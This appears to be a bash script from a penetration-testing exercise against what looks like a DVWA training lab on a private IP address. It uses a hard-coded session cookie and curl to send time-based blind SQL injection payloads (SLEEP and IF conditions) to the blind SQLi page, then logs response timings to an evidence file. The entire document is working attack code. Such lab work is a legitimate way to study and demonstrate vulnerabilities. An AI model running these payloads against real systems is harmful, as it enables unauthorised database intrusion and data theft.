CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=low'
BASE='http://10.31.0.87:3000'
echo "== time-based blind proof (bash SECONDS/ms via date)"
for p in "1' AND SLEEP(3) -- x" "1' AND SLEEP(0) -- x" "1' AND IF(1=1,SLEEP(3),0) -- x" "1' AND IF(1=2,SLEEP(3),0) -- x"; do
  s=$(date +%s%N)
  curl -s -b "$CK" "$BASE/vulnerabilities/sqli_blind/" -G --data-urlencode "id=$p" --data-urlencode "Submit=Submit" -o /dev/null
  e=$(date +%s%N)
  echo "$(( (e-s)/1000000 )) ms  <<== [$p]"
done | tee evidence/sqli/timebased_proof.txt
